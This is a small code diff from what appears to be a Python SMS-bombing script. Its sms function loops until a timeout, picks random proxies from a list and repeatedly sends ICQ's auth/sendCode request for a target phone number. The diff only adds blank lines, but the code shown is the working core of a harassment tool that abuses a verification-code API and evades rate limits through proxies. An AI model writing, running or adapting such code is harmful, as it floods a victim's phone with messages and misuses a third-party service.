@@ -59,6 +59,7 @@ def sms(prx, number, tm, code):
 	
 	try:
 		if prx == 'yes':
+
 			proxy = []
 			t = time.monotonic()
 
@@ -69,7 +70,9 @@ def sms(prx, number, tm, code):
 			proxy = [line.rstrip() for line in proxy]
 
 			while time.monotonic() - t < tm:
+
 				proxies = {'http': 'http://' + random.choice(proxy), 'https': 'http://' + random.choice(proxy)}
+
 				try:
 					url = 'https://u.icq.net/api/v48/rapi/auth/sendCode'
 					params = {"reqId":"66497-1613742053","params":{"phone": number,"language":"ru-RU","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}
